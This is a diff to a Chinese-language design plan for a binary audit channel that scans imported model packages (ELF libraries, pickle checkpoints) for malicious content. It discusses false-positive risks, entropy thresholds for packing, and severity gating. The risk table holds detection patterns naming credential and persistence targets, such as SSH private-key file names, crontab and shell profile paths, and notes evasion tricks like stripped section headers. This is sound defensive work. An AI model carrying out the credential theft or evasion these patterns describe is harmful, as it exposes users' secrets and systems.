+| `presence_downgraded > 0`，且触顶时不随 cap 减少 | **PASS** | 端到端：`TestEndToEndUncorroboratedPresenceStillPasses` 断言等于 1；计数语义：`binary_scanner_test.go:910` 专门钉住「在降级时累加、不随 cap 丢弃而减少」 |
+| `UnsupportedExts` 恒为 0（回归护栏） | **PASS（但依据是「无写入点」，不是某条测试）** | 全树非测试代码里 `UnsupportedExts` 只被读、从未被写：`rules.go:113/115` 声明、`:164` 作为完整性判据的合取项读它，`audit.go:93/411/442` 只是搬运。因此「恒为 0」是结构性的；`failclosed_test.go:44` 用非零夹具证明该判据确实会拒绝。**没有**一条测试在真实扫描上断言它为零——因为没有任何代码路径能把它置非零 |
+
 
 ## 5. 已知风险与对策
 
@@ -5253,7 +10843,22 @@ git commit -m "test(audit): cover the binary channel end to end and document it"
 | --- | --- |
 | `elfFixtureBytes` 的字节布局写错，Task 5–15 全部建立其上 | `TestELFFixtureIsReadByTheStandardLibrary` 先于一切断言检查夹具本身；失败时按 `debug/elf` 的报错逐字段核对 |
 | 大模型包（数 GB）的 `.pt` 让导入变慢 | 证据流式读取，无整文件驻留；容器成员按需解压且有总额预算；超过 `MaxFullScanBytes`（默认 64 MiB）的文件只读首尾各 1 MiB，把单文件成本钉在约 190 ms |
-| 加壳判定对 UPX 打包的合法库误报 | `BIN_001` 定为 MEDIUM：assist 策略下不阻断，gate 策略下阻断并交由 operator 判定，这是两种策略本就存在的分歧点 |
-| 二进制 finding 挤占 LLM 配额 | 两臂各自限流（源码 200、二进制 50），合并列表不再二次截断。**Tier 2 调用上界由 200 变为 250**，且只在两臂同时饱和时可达——那个状态本来就已阻断并删包，多出的调用不改变结论。反过来，共享配额会让大源码臂按路径序挤掉二进制 finding，并把一个原本可导入的包推到 `Truncated` 而被删除 |
-| 二进制通道让原本能导入的包被误阻断 | 这是本设计最贵的失败模式（`ProvesCleanScan` 为假 → `cleanDirContents` 删包），所以：`Truncated` 只由各臂自己的上限触发；纯数据文件的证据截断只记录、不阻断；`BIN_001` 定为 MEDIUM，assist 下不阻断；`security.binaryAudit.enabled=false` 是逐字节回滚。已入库语料实测最大 finding 数为单样本 7、整语料 80，离两个上限都有一个数量级 |
+| 加壳判定对 UPX 打包的合法库误报 | `BIN_001` 定为 HIGH，但触发它的是一次**测量**而不是一次模式匹配：只有可执行节区的熵越过 7.5 bits/byte 才成立，而实测**宿主上 600 个共享对象**（去重后 538 个 ELF，枚举到 2027 个文件条目）的可执行节区最高只有 **6.777009**（**`libcrypto.so.3` 的 `.text`**，3347362 字节，整节读完；`libgomp.so` 的 7.97 落在非可执行的 `.gnu_debugdata`，抽取器根本不测），余量 **0.723** bits。误报面因此是「真的加壳了的合法库」，而不是「碰巧含有某个字节序列的库」；而这一面在已测的 600 个共享对象上是空的——0 个被判结构性、0 个无节表、0 个报错、命中 0 个，最高 6.777009 对阈值 7.5（早先只量了 ollama 那 28 个，最高 6.75，样本扩大二十倍最高值只挪了不到 1%）。**代价必须写清楚：`BIN_001` 是 HIGH，assist（默认策略）下照样阻断**——assist 的通过判据是 `passed = stats.High == 0`（`audit.go:303-304`），而且 assist 的静态判定连 LLM 降级都不认：`recalculateStaticPassed` 存在的唯一理由就是挡住被 LLM 降成 SUSPICIOUS/BENIGN 的静态 HIGH（`verifier.go:204-210`），所以即使 Tier 2 判它 BENIGN 也救不回这个包。也就是说，一个真的用 UPX 打包的合法库会被拒绝导入并拿到一份说它不安全的报告，这正是下一行「二进制通道让原本能导入的包被误阻断」所写的「最贵的失败模式是错误地拒掉一次本该接受的导入」。之所以保留 HIGH 而不退回 MEDIUM：这条判定由一次**测量**触发、其误报面实测为 0（600 个共享对象命中 0 个），而把一个加壳 `.so` 塞进模型包本身就是经典规避手法，值得用一个阻断导入级判定挡住。 |
+| 字符串证据把合法包判成恶意 | 这是本轮实测出的最贵的误报源，对策是把字符串半边整体降级并收窄：源码臂的 `CMD_001`/`PER_001`/`FIL_001`/`ENV_001` 是 HIGH/MEDIUM（`DefaultRules()` + `audit.go:242-243`，MEDIUM 在 `gate` 下照样阻断，`audit.go:301`），所以字符串半边不借它们，改用独立的 LOW 族 `CMD_002`/`PER_002`/`FIL_002`/`ENV_002`；每个 token 两端都锚定（`^…$`）以拒绝 `.pyc` 常量池里拼接出的片段（`'crontabz'`、`.profilez /etc/cron)` 都是实测命中），`'.ssh/id_rsaz'` 则靠**闭合的键名列表**（`id_(?:rsa|dsa|ecdsa|ed25519)`）拒绝——单靠 `$` 不够，`id_[a-z]+` 会把结尾的 `z` 一并吃下，锚点照样满足；`ENV_002` 去掉 `(?i)`，否则小写标识符 `private_key` 会撞上 `PRIVATE_KEY`；`OBF_001` 从二进制臂整体删除（28 个合法库命中 23 个）。LOW 仍进报告、仍送 Tier 2 复核，只是自己不足以阻断 |
+| 二进制 finding 挤占 LLM 配额 | 两臂各自限流（源码 200、二进制 50），合并列表不再二次截断。**Tier 2 调用上界由 200 变为 250**，且只在两臂同时饱和时可达。反过来，共享配额会让大源码臂按路径序挤掉二进制 finding，而那条路只会更贵：被挤掉的是二进制通道的证据，而挤掉它的那条臂本来就已经有 finding |
+| 二进制通道让原本能导入的包被误阻断 | 这是本设计最贵的失败模式（`ProvesCleanScan` 为假 → 这次导入被拒；审计只判、只报，不删文件），所以：**finding 上限不参与完整性**（触顶只写 `findings_capped`/`findings_dropped`，绝不折进 `Report.Truncated`，且 cap 只丢 LOW——能阻断的 HIGH（`assist` 与 `gate`）与 MEDIUM（`gate`）无论预算如何都保留）；纯数据文件的证据截断只记录、不阻断；字符串证据一律 LOW（四个独立族，不借源码臂的 HIGH/MEDIUM id）；`BIN_001` 只由测量触发、不匹配字面量；**ELF 的结构性 fail-closed 只设在"这次没读完"上，不设在"这个文件很大"上**——一个可执行节在每文件 `MaxStreamBytes`（3 GiB）预算内没读完，记为结构性缺口（`section .text declares N bytes, M readable`）并拒绝导入；被删掉的 `MaxSectionBytes`（16 MiB/节）为什么错，判据正在这个分界上：16 MiB 的节上限问的是"这个库是不是太大"，而任何足够大的 `.so` 都会越过某个固定值，于是它把"库比较大"变成阻断理由（实测 libLLVM/libclang/chrome/wireshark 的可执行节都越过它）；3 GiB 的每文件预算问的是"我们能不能把它读完"，实测 600 个共享对象（538 个不同 ELF、2027 个文件条目）里没有一个接近它，触到它意味着这次读取确实没完成——那才是诚实的缺口；`security.binaryAudit.enabled=false` 是逐字节回滚。已入库语料实测最大 finding 数为单样本 7、整语料 80，离两个上限都有一个数量级 |
+| 去掉无节表 fail-open 后，节表被剥离的合法库被误阻断 | 这是本次修订**新引入**的代价，必须与上一行（UPX / `BIN_001`）并列看，而不是只留在 Task 5 的实现里：熵检测的输入是可执行节，而 `len(ef.Sections) == 0` 的文件（`strip --strip-section-headers` 或 `objcopy --strip-section-headers` 的产物、以及某些加壳器的输出）没有可执行节可测，新实现记为 `Bound.Structural`，而 `KindELF` 是可执行类型，于是这次导入被拒。旧行为是"没有节表就直接掉出去、不产生任何行也不产生任何 bound"，也就是把"从未检查过"报成"没发现加壳"（fail-open）；本版刻意翻成 fail-closed，判据是：**对可执行格式，"没看"必须不等于"干净"**。这条误报面**不靠"用 `PT_DYNAMIC` 回补 `DT_NEEDED`/`DT_SONAME`"来修**——那条链要先把 `p_vaddr` 经 `PT_LOAD` 映射回文件偏移、再把 `DT_STRTAB` 的虚地址同样映射一次，是一段独立的新解析逻辑，而它的产出对"有没有被加壳"不提供任何证据，与这条误报面无关。真正的取舍是"宁可为被剥节的库拒绝导入，也不让一个剥了节表头的加壳载荷通过"。已入库语料实测没有这个形状（`models/` 下一个真实 `.so` 都没有，见第 14 条），宿主 600 个共享对象（538 个不同 ELF、2027 个文件条目）里也 0 个无节表（见第 15 条），所以这个代价目前是**潜伏**的，只在包带上一个被剥节的真实库时发作；`security.binaryAudit.enabled=false` 仍是逐字节回滚 |
 | 与 semgrep 非劣性证据的交互 | 二进制通道在**两个臂之外**运行且合并发生在引擎报告之后，两臂的引擎级报告逐字节不变；`corpus_parity_test.go` 会证明这一点 |
+| pickle 解释器的门控开错方向 | 两个方向都是故障，所以各有一个测试钉住：**跑宽了**（对非 pickle 也跑解释器）会让任意字节能被读成 opcode，未知 opcode 直接置 `Bound.Structural`，而 `KindELF`/`KindPickle`/`KindArchive`/`KindCompressed` 都是可执行类型，于是每个 `.pt`/`.whl`/`.so` 都被阻断、原本能导入的包被误拒——`TestCollectEvidenceDoesNotInterpretNonPicklesAsPickles` 用一个良性 ELF 夹具断言既不 `Err` 也无 `Bound.Structural`、无 `SourcePickle` 行；**跑窄了**（该跑的没跑）会丢掉 pickle 证据——`TestPickleInterpreterReadsTheRealCheckpoint` 断言真 checkpoint 仍产出目标。门控规则（只跑在 `KindPickle` 的整文件/容器成员、以及解压后头部嗅探为 pickle 的 gzip 流上）写在 Task 4 Step 4，不得"简化"掉 |
+| 符号证据缺佐证时降为 LOW，未加壳的网络/命令型载荷不再静态阻断 | 这是本轮**明确接受**的取舍，判据来自实测而不是偏好：一个 `.dynsym` 项或 `DT_NEEDED` 名字只说明文件**有能力**调用（链接器把可能引用的每个符号都写进去），而"调用图可达性"作为替代方案已被实测否决——宿主上被标记的 9 个合法库**一个都翻不了案**（`libllama-common` 在 `.dynsym` 里定义/弱定义 2878/2881 个函数，`socket` 的调用者本身就是导出入口），且 guest rootfs 里没有反汇编器、`golang.org/x/arch` 离线不可得。保留的判定：`BIN_001`（加壳，一次**测量**，无条件 HIGH）与 `PKL_001`（pickle 解释器真的走完 opcode 流），`NET_002`/`CMD_001`/`BIN_002` 只在**同一文件**内有这两者之一时才 HIGH。Tier 2 仍是兜底：降级的 finding 照常进报告、照常送给模型，模型判 MALICIOUS 时 `ClassifyFindingRisk` 分类为 HIGH 并阻断（`audit.go:212-252`）——所以「降级」去掉的是一次自动阻断，不是这条证据，**没有佐证也不等于无害**。**不得**把 `BIN_002` 或"第二个符号族"当作佐证：前者本身就是符号表里的名字，后者更是合法大库的常态（`libllama-common` 有网络符号、`libggml-base` 有 `execlp`），任一条加进去都会让本规则对实测要救的库**完全不生效** |
+| 二进制通道无法被取消，且它失败时这次导入会被拒 | `GenerateAuditReport` 由 `internal/controller/import_processing.go:642` 以 `context.Background()` 调用，新增的 `runBinaryChannel`/`ScanDirectory` 都不收 context，所以**单个文件**的工作量被 `BinaryConfig` 的上限钉住，而**总**工作量随文件数线性增长，且没有任何东西能中断它。这是既有的形状而不是新引入的类别——`engine.ScanDirectoryWithLines` 同样不收 context——所以这里只当作一个已知边界记录：一次导入的二进制臂时长与文件数成正比，超时与否只能由调用方在整条审计之外控制，本计划不新增逐文件的取消路径。同一个 `context.Background()` 调用点也是**为什么 `runBinaryChannel` 不返回 error**：`internal/controller/import_processing.go:642-660` 对任何 error 都在 `GenerateAuditReport` 之后立刻上报 code=2 并返回（Task 11a 之后不再删包，但错误路径让审计报告根本没机会生成），逐文件失败（已计为 `Incomplete`）或整趟失败（已计为 `Errored`）若从那条路出去，报告就丢掉了说明原因的那一段——导入照样被拒，但 operator 看不到为什么 |
+| `DYN_001` 只有符号证据却是 MEDIUM，`gate` 下会误阻断合法共享库（终审 finding 1，本行是**补记**，行为未改） | 佐证门控的判定条件是 `presenceOnly() && Severity == SeverityHigh`（`binary_rules.go:565-572`），而 `DYN_001` 的家族（`binary_rules.go:283-289`）虽然只有 `SourceDynsym` 一个来源、确实是 presence-only，它的严重级却是**借**共享表的 MEDIUM（`rules.go:248-258`）。第二个合取项因此为假，**门控对 `DYN_001` 永不生效**——该处注释（`binary_rules.go:554-556`）已写明这一点。后果是具体的：一个**合法**共享库只要 `.dynsym` 导入 `dlopen`/`dlmopen`/`dlsym`（插件加载、后端分发类库的常态），二进制臂就产出 `DYN_001` MEDIUM，而 `gate` 的通过判据是 `passed = stats.High == 0 && stats.Medium == 0`（`audit.go:323`），**这次导入被拒**；`assist`（默认，判据在 `audit.go:326`）只看 `High == 0`，所以同一份证据在默认策略下不阻断——差异只在策略上。Tier 2 也救不回：静态判定不认 LLM 的降级（`recalculateStaticPassed`，`verifier.go:204-210`）。**这与上一行是同一取向的两半，但方向相反**：上一行把"一个名字"降为 LOW 是为了不让它静态阻断，而 `DYN_001` 恰好在严重级上落在门控之外，等于同一类证据（`.dynsym` 里的一条名字）在 `gate` 下仍然阻断。**是否把门控扩到 presence-only 的 MEDIUM 族是产品取舍，已于 2026-10-13 提交用户决定：用户选择「保持现状，只记录」**——理由是三选一里另外两条都要改规则表并再走一轮评审，而 `assist` 才是默认策略、`gate` 是显式选择的严格模式，其语义本就是 `High == 0 && Medium == 0`；把一族 MEDIUM 降成 LOW 会悄悄削弱唯一以严格为目的的策略。因此本计划**不改行为**，只把它记进已知风险：**选 `gate` 的部署要知道「包里的 `.so` 只要 `.dynsym` 导入 `dlopen`/`dlmopen`/`dlsym` 就会被拒」**；需要这条路放行时，做法是改用 `assist`，或者给那个 `.so` 补上佐证（真加壳的高熵可执行节、或同文件的 pickle 目标），而不是改门控判据 |
+
+## 6. 终审遗留项（两处 nit，均为**记录不修**）
+
+全分支终审（2026-10-13）除上面已闭合的 finding 1–4 外，另报了两处 nit。两者都不构成生产缺陷，且修它们要动共享文件或新增测试并再走一轮评审，所以在此如实记录、**本轮不改**：
+
+| 编号 | 位置 | 内容 | 为什么留在这里而不是直接修 |
+| --- | --- | --- | --- |
+| 5 | `internal/config/config.go:44-54` | `BinaryAuditHighEntropyThreshold` 的注释先写「Zero means the codeaudit default (7.5)」，又写「The whole of [0,8] is accepted, and neither end is neutral」。两句并读会让读者以为 0 是一个阈值——而 0 是「未设置」的哨兵（`validateBinaryAudit` 放行 0，`normalizeBinaryConfig` 的判据是 `<= 0` 就回退默认），真正可用的低端是 6.0–6.5 那个区位而不是 0。**注释没有说假话**（0 确实被接受），只是把哨兵和被接受的区间并列，读起来自相矛盾 | 纯注释澄清，无行为变化；但它落在本分支之外的共享文件上，为一行措辞改动去碰它不划算。**若日后改动该字段，顺手把这句说清**：接受区间是 [0,8]，其中 0 是哨兵不是阈值 |
+| 6 | `internal/controller/` | 没有任何 controller 测试构造带 `Binary` 的 `SecurityConfig`，所以「`SecurityConfig.Binary` → `codeaudit.AuditConfig`」这一段没有测试钉住。**需要注意的是这条 seam 并非全无覆盖**，只是覆盖在另一层：`internal/app/taa/app_test.go:119-123` 与 `:266-284` 逐字段钉住了 `StartupConfig.BinaryAudit*` → `SecurityConfig.Binary`（`sec.Binary.MaxArchiveMembers` 等五项逐一相等）。真正没被钉的是最后那一跳——`import_processing.go:646` 的 `codeaudit.AuditConfig{LLM: cfg, Binary: s.Security.Binary}` | 这一跳是单行透传、且就在唯一的审计调用点上，肉眼可核；补它要新增 controller 测试并再走一轮规格+质量评审，代价与收益不成比例。**它列在这里是为将来加 controller 级审计测试时留个锚点**，不是一条待办 |
